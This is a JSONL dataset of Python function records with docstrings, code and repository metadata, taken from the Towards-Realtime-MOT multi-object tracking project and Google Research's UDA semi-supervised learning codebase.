{"docstring": "\"\"\"\nreturns nT, nCorrect, tx, ty, tw, th, tconf, tcls\n\"\"\"\n", "func_signal": "def build_targets_max(target, anchor_wh, nA, nC, nGh, nGw):\n", "code": "nB = len(target)  # number of images in batch\n\ntxy = torch.zeros(nB, nA, nGh, nGw, 2).cuda()  # batch size, anchors, grid size\ntwh = torch.zeros(nB, nA, nGh, nGw, 2).cuda()\ntconf = torch.LongTensor(nB, nA, nGh, nGw).fill_(0).cuda()\ntcls = torch.ByteTensor(nB, nA, nGh, nGw, nC).fill_(0).cuda()  # nC = number of classes\ntid = torch.LongTensor(nB, nA, nGh, nGw, 1).fill_(-1).cuda() \nfor b in range(nB):\n    t = target[b]\n    t_id = t[:, 1].clone().long().cuda()\n    t = t[:,[0,2,3,4,5]]\n    nTb = len(t)  # number of targets\n    if nTb == 0:\n        continue\n\n    #gxy, gwh = t[:, 1:3] * nG, t[:, 3:5] * nG\n    gxy, gwh = t[: , 1:3].clone() , t[:, 3:5].clone()\n    gxy[:, 0] = gxy[:, 0] * nGw\n    gxy[:, 1] = gxy[:, 1] * nGh\n    gwh[:, 0] = gwh[:, 0] * nGw\n    gwh[:, 1] = gwh[:, 1] * nGh\n    gi = torch.clamp(gxy[:, 0], min=0, max=nGw -1).long()\n    gj = torch.clamp(gxy[:, 1], min=0, max=nGh -1).long()\n\n    # Get grid box indices and prevent overflows (i.e. 13.01 on 13 anchors)\n    #gi, gj = torch.clamp(gxy.long(), min=0, max=nG - 1).t()\n    #gi, gj = gxy.long().t()\n\n    # iou of targets-anchors (using wh only)\n    box1 = gwh\n    box2 = anchor_wh.unsqueeze(1)\n    inter_area = torch.min(box1, box2).prod(2)\n    iou = inter_area / (box1.prod(1) + box2.prod(2) - inter_area + 1e-16)\n\n    # Select best iou_pred and anchor\n    iou_best, a = iou.max(0)  # best anchor [0-2] for each target\n\n    # Select best unique target-anchor combinations\n    if nTb > 1:\n        _, iou_order = torch.sort(-iou_best)  # best to worst\n\n        # Unique anchor selection\n        u = torch.stack((gi, gj, a), 0)[:, iou_order]\n        # _, first_unique = np.unique(u, axis=1, return_index=True)  # first unique indices\n        first_unique = return_torch_unique_index(u, torch.unique(u, dim=1))  # torch alternative\n        i = iou_order[first_unique]\n        # best anchor must share significant commonality (iou) with target\n        i = i[iou_best[i] > 0.60]  # TODO: examine arbitrary threshold\n        if len(i) == 0:\n            continue\n\n        a, gj, gi, t = a[i], gj[i], gi[i], t[i]\n        t_id = t_id[i]\n        if len(t.shape) == 1:\n            t = t.view(1, 5)\n    else:\n        if iou_best < 0.60:\n            continue\n    \n    tc, gxy, gwh = t[:, 0].long(), t[:, 1:3].clone(), t[:, 3:5].clone()\n    gxy[:, 0] = gxy[:, 0] * nGw\n    gxy[:, 1] = gxy[:, 1] * nGh\n    gwh[:, 0] = gwh[:, 0] * nGw\n    gwh[:, 1] = gwh[:, 1] * nGh\n\n    # XY coordinates\n    txy[b, a, gj, gi] = gxy - gxy.floor()\n\n    # Width and height\n    twh[b, a, gj, gi] = torch.log(gwh / anchor_wh[a])  # yolo method\n    # twh[b, a, gj, gi] = torch.sqrt(gwh / anchor_wh[a]) / 2 # power method\n\n    # One-hot encoding of label\n    tcls[b, a, gj, gi, tc] = 1\n    tconf[b, a, gj, gi] = 1\n    tid[b, a, gj, gi] = t_id.unsqueeze(1)\ntbox = torch.cat([txy, twh], -1)\nreturn tconf, tbox, tid", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nLoads class labels at 'path'\n\"\"\"\n", "func_signal": "def load_classes(path):\n", "code": "fp = open(path, 'r')\nnames = fp.read().split('\\n')\nreturn list(filter(None, names))  # filter removes empty strings (such as last line)", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"Get current position in bounding box format `(top left x, top left y,\n        width, height)`.\n\"\"\"\n", "func_signal": "def tlwh(self):\n", "code": "if self.mean is None:\n    return self._tlwh.copy()\nret = self.mean[:4].copy()\nret[2] *= ret[3]\nret[:2] -= ret[2:] / 2\nreturn ret", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "# Strip optimizer from *.pt files for lighter files (reduced by 2/3 size)\n", "func_signal": "def strip_optimizer_from_checkpoint(filename='weights/best.pt'):\n", "code": "a = torch.load(filename, map_location='cpu')\na['optimizer'] = []\ntorch.save(a, filename.replace('.pt', '_lite.pt'))", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "'''\n:param: delta_map, shape (nB, nA, nGh, nGw, 4)\n:param: anchors, shape (nA,4)\n'''\n", "func_signal": "def decode_delta_map(delta_map, anchors):\n", "code": "nB, nA, nGh, nGw, _ = delta_map.shape\nanchor_mesh = generate_anchor(nGh, nGw, anchors) \nanchor_mesh = anchor_mesh.permute(0,2,3,1).contiguous()              # Shpae (nA x nGh x nGw) x 4\nanchor_mesh = anchor_mesh.unsqueeze(0).repeat(nB,1,1,1,1)\npred_list = decode_delta(delta_map.view(-1,4), anchor_mesh.view(-1,4))\npred_map = pred_list.view(nB, nA, nGh, nGw, 4)\nreturn pred_map", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nUpdate a matched track\n:type new_track: STrack\n:type frame_id: int\n:type update_feature: bool\n:return:\n\"\"\"\n", "func_signal": "def update(self, new_track, frame_id, update_feature=True):\n", "code": "self.frame_id = frame_id\nself.tracklet_len += 1\n\nnew_tlwh = new_track.tlwh\nself.mean, self.covariance = self.kalman_filter.update(\n    self.mean, self.covariance, self.tlwh_to_xyah(new_tlwh))\nself.state = TrackState.Tracked\nself.is_activated = True\n\nself.score = new_track.score\nif update_feature:\n    self.update_features(new_track.curr_feat)", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\" Computes the average precision, given the recall and precision curves.\nMethod originally from https://github.com/rafaelpadilla/Object-Detection-Metrics.\n# Arguments\n    tp:    True positives (list).\n    conf:  Objectness value from 0-1 (list).\n    pred_cls: Predicted object classes (list).\n    target_cls: True object classes (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n\n# lists/pytorch to numpy\n", "func_signal": "def ap_per_class(tp, conf, pred_cls, target_cls):\n", "code": "tp, conf, pred_cls, target_cls = np.array(tp), np.array(conf), np.array(pred_cls), np.array(target_cls)\n\n# Sort by objectness\ni = np.argsort(-conf)\ntp, conf, pred_cls = tp[i], conf[i], pred_cls[i]\n\n# Find unique classes\nunique_classes = np.unique(np.concatenate((pred_cls, target_cls), 0))\n\n# Create Precision-Recall curve and compute AP for each class\nap, p, r = [], [], []\nfor c in unique_classes:\n    i = pred_cls == c\n    n_gt = sum(target_cls == c)  # Number of ground truth objects\n    n_p = sum(i)  # Number of predicted objects\n\n    if (n_p == 0) and (n_gt == 0):\n        continue\n    elif (n_p == 0) or (n_gt == 0):\n        ap.append(0)\n        r.append(0)\n        p.append(0)\n    else:\n        # Accumulate FPs and TPs\n        fpc = np.cumsum(1 - tp[i])\n        tpc = np.cumsum(tp[i])\n\n        # Recall\n        recall_curve = tpc / (n_gt + 1e-16)\n        r.append(tpc[-1] / (n_gt + 1e-16))\n\n        # Precision\n        precision_curve = tpc / (tpc + fpc)\n        p.append(tpc[-1] / (tpc[-1] + fpc[-1]))\n\n        # AP from recall-precision curve\n        ap.append(compute_ap(recall_curve, precision_curve))\n\nreturn np.array(ap), unique_classes.astype('int32'), np.array(r), np.array(p)", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "# Convert bounding box format from [x1, y1, x2, y2] to [x, y, w, h]\n# x, y are coordinates of center \n# (x1, y1) and (x2, y2) are coordinates of bottom left and top right respectively. \n", "func_signal": "def xyxy2xywh(x):\n", "code": "y = torch.zeros_like(x) if x.dtype is torch.float32 else np.zeros_like(x)\ny[:, 0] = (x[:, 0] + x[:, 2]) / 2  # x center\ny[:, 1] = (x[:, 1] + x[:, 3]) / 2  # y center\ny[:, 2] = x[:, 2] - x[:, 0]  # width\ny[:, 3] = x[:, 3] - x[:, 1]  # height\nreturn y", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nReturns the IoU of two bounding boxes\n\"\"\"\n", "func_signal": "def bbox_iou(box1, box2, x1y1x2y2=False):\n", "code": "N, M = len(box1), len(box2)\nif x1y1x2y2:\n    # Get the coordinates of bounding boxes\n    b1_x1, b1_y1, b1_x2, b1_y2 = box1[:, 0], box1[:, 1], box1[:, 2], box1[:, 3]\n    b2_x1, b2_y1, b2_x2, b2_y2 = box2[:, 0], box2[:, 1], box2[:, 2], box2[:, 3]\nelse:\n    # Transform from center and width to exact coordinates\n    b1_x1, b1_x2 = box1[:, 0] - box1[:, 2] / 2, box1[:, 0] + box1[:, 2] / 2\n    b1_y1, b1_y2 = box1[:, 1] - box1[:, 3] / 2, box1[:, 1] + box1[:, 3] / 2\n    b2_x1, b2_x2 = box2[:, 0] - box2[:, 2] / 2, box2[:, 0] + box2[:, 2] / 2\n    b2_y1, b2_y2 = box2[:, 1] - box2[:, 3] / 2, box2[:, 1] + box2[:, 3] / 2\n\n# get the coordinates of the intersection rectangle\ninter_rect_x1 = torch.max(b1_x1.unsqueeze(1), b2_x1)\ninter_rect_y1 = torch.max(b1_y1.unsqueeze(1), b2_y1)\ninter_rect_x2 = torch.min(b1_x2.unsqueeze(1), b2_x2)\ninter_rect_y2 = torch.min(b1_y2.unsqueeze(1), b2_y2)\n# Intersection area\ninter_area = torch.clamp(inter_rect_x2 - inter_rect_x1, 0) * torch.clamp(inter_rect_y2 - inter_rect_y1, 0)\n# Union Area\nb1_area = ((b1_x2 - b1_x1) * (b1_y2 - b1_y1))\nb1_area = ((b1_x2 - b1_x1) * (b1_y2 - b1_y1)).view(-1,1).expand(N,M)\nb2_area = ((b2_x2 - b2_x1) * (b2_y2 - b2_y1)).view(1,-1).expand(N,M)\n\nreturn inter_area / (b1_area + b2_area - inter_area + 1e-16)", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"Convert bounding box to format `(min x, min y, max x, max y)`, i.e.,\n`(top left, bottom right)`.\n\"\"\"\n", "func_signal": "def tlbr(self):\n", "code": "ret = self.tlwh.copy()\nret[2:] += ret[:2]\nreturn ret", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nPlots one bounding box on image img.\n\"\"\"\n", "func_signal": "def plot_one_box(x, img, color=None, label=None, line_thickness=None):\n", "code": "tl = line_thickness or round(0.0004 * max(img.shape[0:2])) + 1  # line thickness\ncolor = color or [random.randint(0, 255) for _ in range(3)]\nc1, c2 = (int(x[0]), int(x[1])), (int(x[2]), int(x[3]))\ncv2.rectangle(img, c1, c2, color, thickness=tl)\nif label:\n    tf = max(tl - 1, 1)  # font thickness\n    t_size = cv2.getTextSize(label, 0, fontScale=tl / 3, thickness=tf)[0]\n    c2 = c1[0] + t_size[0], c1[1] - t_size[1] - 3\n    cv2.rectangle(img, c1, c2, color, -1)  # filled\n    cv2.putText(img, label, (c1[0], c1[1] - 2), 0, tl / 3, [225, 255, 255], thickness=tf, lineType=cv2.LINE_AA)", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nProcesses the image frame and finds bounding box(detections).\n\nAssociates the detection with corresponding tracklets and also handles lost, removed, refound and active tracklets\n\nParameters\n----------\nim_blob : torch.float32\n          Tensor of shape depending upon the size of image. By default, shape of this tensor is [1, 3, 608, 1088]\n\nimg0 : ndarray\n       ndarray of shape depending on the input image sequence. By default, shape is [608, 1080, 3]\n\nReturns\n-------\noutput_stracks : list of Strack(instances)\n                 The list contains information regarding the online_tracklets for the recieved image tensor.\n\n\"\"\"\n\n", "func_signal": "def update(self, im_blob, img0):\n", "code": "self.frame_id += 1\nactivated_starcks = []      # for storing active tracks, for the current frame\nrefind_stracks = []         # Lost Tracks whose detections are obtained in the current frame\nlost_stracks = []           # The tracks which are not obtained in the current frame but are not removed.(Lost for some time lesser than the threshold for removing)\nremoved_stracks = []\n\nt1 = time.time()\n''' Step 1: Network forward, get detections & embeddings'''\nwith torch.no_grad():\n    pred = self.model(im_blob)\n# pred is tensor of all the proposals (default number of proposals: 54264). Proposals have information associated with the bounding box and embeddings\npred = pred[pred[:, :, 4] > self.opt.conf_thres]\n# pred now has lesser number of proposals. Proposals rejected on basis of object confidence score\nif len(pred) > 0:\n    dets = non_max_suppression(pred.unsqueeze(0), self.opt.conf_thres, self.opt.nms_thres)[0].cpu()\n    # Final proposals are obtained in dets. Information of bounding box and embeddings also included\n    # Next step changes the detection scales\n    scale_coords(self.opt.img_size, dets[:, :4], img0.shape).round()\n    '''Detections is list of (x1, y1, x2, y2, object_conf, class_score, class_pred)'''\n    # class_pred is the embeddings.\n\n    detections = [STrack(STrack.tlbr_to_tlwh(tlbrs[:4]), tlbrs[4], f.numpy(), 30) for\n                  (tlbrs, f) in zip(dets[:, :5], dets[:, 6:])]\nelse:\n    detections = []\n\nt2 = time.time()\n# print('Forward: {} s'.format(t2-t1))\n\n''' Add newly detected tracklets to tracked_stracks'''\nunconfirmed = []\ntracked_stracks = []  # type: list[STrack]\nfor track in self.tracked_stracks:\n    if not track.is_activated:\n        # previous tracks which are not active in the current frame are added in unconfirmed list\n        unconfirmed.append(track)\n        # print(\"Should not be here, in unconfirmed\")\n    else:\n        # Active tracks are added to the local list 'tracked_stracks'\n        tracked_stracks.append(track)\n\n''' Step 2: First association, with embedding'''\n# Combining currently tracked_stracks and lost_stracks\nstrack_pool = joint_stracks(tracked_stracks, self.lost_stracks)\n# Predict the current location with KF\nSTrack.multi_predict(strack_pool, self.kalman_filter)\n\n\ndists = matching.embedding_distance(strack_pool, detections)\n# dists = matching.gate_cost_matrix(self.kalman_filter, dists, strack_pool, detections)\ndists = matching.fuse_motion(self.kalman_filter, dists, strack_pool, detections)\n# The dists is the list of distances of the detection with the tracks in strack_pool\nmatches, u_track, u_detection = matching.linear_assignment(dists, thresh=0.7)\n# The matches is the array for corresponding matches of the detection with the corresponding strack_pool\n\nfor itracked, idet in matches:\n    # itracked is the id of the track and idet is the detection\n    track = strack_pool[itracked]\n    det = detections[idet]\n    if track.state == TrackState.Tracked:\n        # If the track is active, add the detection to the track\n        track.update(detections[idet], self.frame_id)\n        activated_starcks.append(track)\n    else:\n        # We have obtained a detection from a track which is not active, hence put the track in refind_stracks list\n        track.re_activate(det, self.frame_id, new_id=False)\n        refind_stracks.append(track)\n\n# None of the steps below happen if there are no undetected tracks.\n''' Step 3: Second association, with IOU'''\ndetections = [detections[i] for i in u_detection]\n# detections is now a list of the unmatched detections\nr_tracked_stracks = [] # This is container for stracks which were tracked till the\n# previous frame but no detection was found for it in the current frame\nfor i in u_track:\n    if strack_pool[i].state == TrackState.Tracked:\n        r_tracked_stracks.append(strack_pool[i])\ndists = matching.iou_distance(r_tracked_stracks, detections)\nmatches, u_track, u_detection = matching.linear_assignment(dists, thresh=0.5)\n# matches is the list of detections which matched with corresponding tracks by IOU distance method\nfor itracked, idet in matches:\n    track = r_tracked_stracks[itracked]\n    det = detections[idet]\n    if track.state == TrackState.Tracked:\n        track.update(det, self.frame_id)\n        activated_starcks.append(track)\n    else:\n        track.re_activate(det, self.frame_id, new_id=False)\n        refind_stracks.append(track)\n# Same process done for some unmatched detections, but now considering IOU_distance as measure\n\nfor it in u_track:\n    track = r_tracked_stracks[it]\n    if not track.state == TrackState.Lost:\n        track.mark_lost()\n        lost_stracks.append(track)\n# If no detections are obtained for tracks (u_track), the tracks are added to lost_tracks list and are marked lost\n\n'''Deal with unconfirmed tracks, usually tracks with only one beginning frame'''\ndetections = [detections[i] for i in u_detection]\ndists = matching.iou_distance(unconfirmed, detections)\nmatches, u_unconfirmed, u_detection = matching.linear_assignment(dists, thresh=0.7)\nfor itracked, idet in matches:\n    unconfirmed[itracked].update(detections[idet], self.frame_id)\n    activated_starcks.append(unconfirmed[itracked])\n\n# The tracks which are yet not matched\nfor it in u_unconfirmed:\n    track = unconfirmed[it]\n    track.mark_removed()\n    removed_stracks.append(track)\n\n# after all these confirmation steps, if a new detection is found, it is initialized for a new track\n\"\"\" Step 4: Init new stracks\"\"\"\nfor inew in u_detection:\n    track = detections[inew]\n    if track.score < self.det_thresh:\n        continue\n    track.activate(self.kalman_filter, self.frame_id)\n    activated_starcks.append(track)\n\n\"\"\" Step 5: Update state\"\"\"\n# If the tracks are lost for more frames than the threshold number, the tracks are removed.\nfor track in self.lost_stracks:\n    if self.frame_id - track.end_frame > self.max_time_lost:\n        track.mark_removed()\n        removed_stracks.append(track)\n# print('Remained match {} s'.format(t4-t3))\n\n# Update the self.tracked_stracks and self.lost_stracks using the updates in this step.\nself.tracked_stracks = [t for t in self.tracked_stracks if t.state == TrackState.Tracked]\nself.tracked_stracks = joint_stracks(self.tracked_stracks, activated_starcks)\nself.tracked_stracks = joint_stracks(self.tracked_stracks, refind_stracks)\n# self.lost_stracks = [t for t in self.lost_stracks if t.state == TrackState.Lost]  # type: list[STrack]\nself.lost_stracks = sub_stracks(self.lost_stracks, self.tracked_stracks)\nself.lost_stracks.extend(lost_stracks)\nself.lost_stracks = sub_stracks(self.lost_stracks, self.removed_stracks)\nself.removed_stracks.extend(removed_stracks)\nself.tracked_stracks, self.lost_stracks = remove_duplicate_stracks(self.tracked_stracks, self.lost_stracks)\n\n# get scores of lost tracks\noutput_stracks = [track for track in self.tracked_stracks if track.is_activated]\n\nlogger.debug('===========Frame {}=========='.format(self.frame_id))\nlogger.debug('Activated: {}'.format([track.track_id for track in activated_starcks]))\nlogger.debug('Refind: {}'.format([track.track_id for track in refind_stracks]))\nlogger.debug('Lost: {}'.format([track.track_id for track in lost_stracks]))\nlogger.debug('Removed: {}'.format([track.track_id for track in removed_stracks]))\n# print('Final {} s'.format(t5-t4))\nreturn output_stracks", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"Further split sentences when nltk's sent_tokenizer fail.\"\"\"\n", "func_signal": "def split_sent_by_punc(sent, punc, offset):\n", "code": "sent_list = []\nstart = 0\nwhile start < len(sent):\n  if punc:\n    pos = sent.find(punc, start + offset)\n  else:\n    pos = start + offset\n  if pos != -1:\n    sent_list += [sent[start: pos + 1]]\n    start = pos + 1\n  else:\n    sent_list += [sent[start:]]\n    break\nreturn sent_list", "path": "uda/back_translate/split_paragraphs.py", "commit_date": "2019-08-21 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"clean text.\"\"\"\n", "func_signal": "def clean_web_text(st):\n", "code": "st = st.replace(\"<br />\", \" \")\nst = st.replace(\"&quot;\", \"\\\"\")\nst = st.replace(\"<p>\", \" \")\nif \"<a href=\" in st:\n  while \"<a href=\" in st:\n    start_pos = st.find(\"<a href=\")\n    end_pos = st.find(\">\", start_pos)\n    if end_pos != -1:\n      st = st[:start_pos] + st[end_pos + 1:]\n    else:\n      print(\"incomplete href\")\n      print(\"before\", st)\n      st = st[:start_pos] + st[start_pos + len(\"<a href=\")]\n      print(\"after\", st)\n\n  st = st.replace(\"</a>\", \"\")\nst = st.replace(\"\\\\n\", \" \")\n# st = st.replace(\"\\\\\", \" \")\n# while \"  \" in st:\n#   st = st.replace(\"  \", \" \")\nreturn st", "path": "uda/text/utils/imdb_format.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "# load train\n", "func_signal": "def main(_):\n", "code": "header = [\"content\", \"label\", \"id\"]\ncontents = load_data_by_id(\"train\", FLAGS.train_id_path)\nos.mkdir(FLAGS.output_dir)\ndump_raw_data(\n    [header] + contents,\n    os.path.join(FLAGS.output_dir, \"train.csv\"),\n)\n# load test\ncontents = load_all_data(\"test\")\ndump_raw_data(\n    [header] + contents,\n    os.path.join(FLAGS.output_dir, \"test.csv\"),\n)", "path": "uda/text/utils/imdb_format.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Decodes a record to a TensorFlow example.\"\"\"\n", "func_signal": "def _decode_record(record, name_to_features):\n", "code": "example = tf.parse_single_example(record, name_to_features)\n\n# tf.Example only supports tf.int64, but the TPU only supports tf.int32.\n# So cast all int64 to int32.\nfor name in list(example.keys()):\n  t = example[name]\n  if t.dtype == tf.int64:\n    t = tf.to_int32(t)\n  example[name] = t\n\nreturn example", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"The `input_fn` for TPUEstimator which generates the feature dataset.\"\"\"\n", "func_signal": "def input_fn(params):\n", "code": "sup_batch_size = params[\"batch_size\"]\ntotal_batch_size = 0\ntf.logging.info(\"sup batch size: %d\", (sup_batch_size))\n\ndataset_list = []\n\n# For training, we want a lot of parallel reading and shuffling.\n# For eval, we want no shuffling and parallel reading doesn't matter.\nif sup_data_base_path is not None:\n  sup_dst = get_training_dataset(\n      sup_total_data_files,\n      sup_batch_size,\n      num_threads,\n      is_training,\n      shuffle_buffer_size,\n      get_sup_feature_specs())\n  total_batch_size += sup_batch_size\n  tf.logging.info(\"sup batch size: %d\", (sup_batch_size))\n  dataset_list.append(sup_dst)\n\n  ## only consider unsupervised data when supervised data is considered\n  if unsup_data_base_path is not None and FLAGS.unsup_ratio > 0:\n    unsup_dst = get_training_dataset(\n        unsup_total_data_files,\n        sup_batch_size * unsup_ratio,\n        num_threads,\n        is_training,\n        shuffle_buffer_size,\n        get_unsup_feature_specs())\n    total_batch_size += sup_batch_size * unsup_ratio * 2\n    dataset_list.append(unsup_dst)\n    tf.logging.info(\"unsup batch size: %d\", (sup_batch_size * unsup_ratio))\n\ntf.logging.info(\"total sample in a batch: %d\", (total_batch_size))\n\ndef flatten_input(*features):\n  \"\"\"Merging multiple feature dicts resulted from zipped datasets.\"\"\"\n  result = {}\n  for feature in features:\n    for key in feature:\n      assert key not in result\n      result[key] = feature[key]\n\n  return result\n\nif len(dataset_list) > 1:\n  d = tf.data.Dataset.zip(tuple(dataset_list))\n  d = d.map(flatten_input)\nelse:\n  d = dataset_list[0]\n\n# Prefetching creates a buffer to make sure there is always data to\n# read in the event of network latency variance.\nd = d.prefetch(prefetch_size)\n\n# TPUEstimator supports returning a dataset instead of just features.\n# It will call `make_one_shot_iterator()` and such.\nreturn d", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Get supervised feature.\"\"\"\n", "func_signal": "def get_sup_feature_specs():\n", "code": "feature_specs = collections.OrderedDict()\nfeature_specs[\"input_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"input_mask\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"input_type_ids\"] = tf.FixedLenFeature(\n    [FLAGS.max_seq_length], tf.int64)\nfeature_specs[\"label_ids\"] = tf.FixedLenFeature(\n    [1], tf.int64)\nreturn feature_specs", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Returns the file names expected to exist in the input_dir.\"\"\"\n", "func_signal": "def get_raw_data_filenames(split):\n", "code": "if FLAGS.task_name == \"cifar10\":\n  if split == \"train\":\n    return [\"data_batch_%d\" % i for i in xrange(1, 6)]\n  elif split == \"test\":\n    return [\"test_batch\"]\nelse:\n  assert False", "path": "uda/image/preprocess.py", "commit_date": "2019-11-04 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"build non-repeat dataset from files.\"\"\"\n", "func_signal": "def get_evaluation_dataset(total_data_files, batch_size, feature_specs):\n", "code": "d = tf.data.TFRecordDataset(total_data_files)\nd = d.apply(\n    tf.contrib.data.map_and_batch(\n        lambda record: _decode_record(record, feature_specs),\n        batch_size=batch_size,\n        num_parallel_batches=None,\n        drop_remainder=True))\n\nreturn d", "path": "uda/text/utils/proc_data_utils.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Sets up the argscopes that will be used when building an image model.\n\nArgs:\n  is_training: Is the model training or not.\n\nReturns:\n  Arg scopes to be put around the model being constructed.\n\"\"\"\n\n", "func_signal": "def setup_arg_scopes(is_training):\n", "code": "batch_norm_decay = 0.9\nbatch_norm_epsilon = 1e-5\nbatch_norm_params = {\n    # Decay for the moving averages.\n    \"decay\": batch_norm_decay,\n    # epsilon to prevent 0s in variance.\n    \"epsilon\": batch_norm_epsilon,\n    \"scale\": True,\n    # collection containing the moving mean and moving variance.\n    \"is_training\": is_training,\n}\n\nscopes = []\n\nscopes.append(arg_scope([ops.batch_norm], **batch_norm_params))\nreturn scopes", "path": "uda/image/main.py", "commit_date": "2020-02-03 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"get adam optimizer.\"\"\"\n# It is recommended that you use this optimizer for fine tuning, since this\n# is how the model was trained (note that the Adam m/v variables are NOT\n# loaded from init_checkpoint.)\n", "func_signal": "def get_adam_optimizer(learning_rate, use_tpu):\n", "code": "optimizer = AdamWeightDecayOptimizer(\n    learning_rate=learning_rate,\n    weight_decay_rate=0.01,\n    beta_1=0.9,\n    beta_2=0.999,\n    epsilon=1e-6,\n    exclude_from_weight_decay=[\"LayerNorm\", \"layer_norm\", \"bias\"])\n\nif use_tpu:\n  optimizer = tf.contrib.tpu.CrossShardOptimizer(optimizer)\nreturn optimizer", "path": "uda/text/bert/optimization.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "\"\"\"Whether to use L2 weight decay for `param_name`.\"\"\"\n", "func_signal": "def _do_use_weight_decay(self, param_name):\n", "code": "if not self.weight_decay_rate:\n  return False\nif self.exclude_from_weight_decay:\n  for r in self.exclude_from_weight_decay:\n    if re.search(r, param_name) is not None:\n      return False\nreturn True", "path": "uda/text/bert/multi_gpu_optimizer.py", "commit_date": "2019-06-19 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
{"docstring": "# classification loss & accuracy\n", "func_signal": "def metric_fn(per_example_loss, label_ids, logits):\n", "code": "loss = tf.metrics.mean(per_example_loss)\n\npredictions = tf.argmax(logits, axis=-1, output_type=tf.int32)\naccuracy = tf.metrics.accuracy(label_ids, predictions)\n\nret_dict = {\n    \"eval/classify_loss\": loss,\n    \"eval/classify_accuracy\": accuracy\n}\n\nreturn ret_dict", "path": "uda/image/main.py", "commit_date": "2020-02-03 00:00:00", "repo_name": "google-research/uda", "stars": 2157, "license": "apache-2.0", "language": "python", "size": 342}
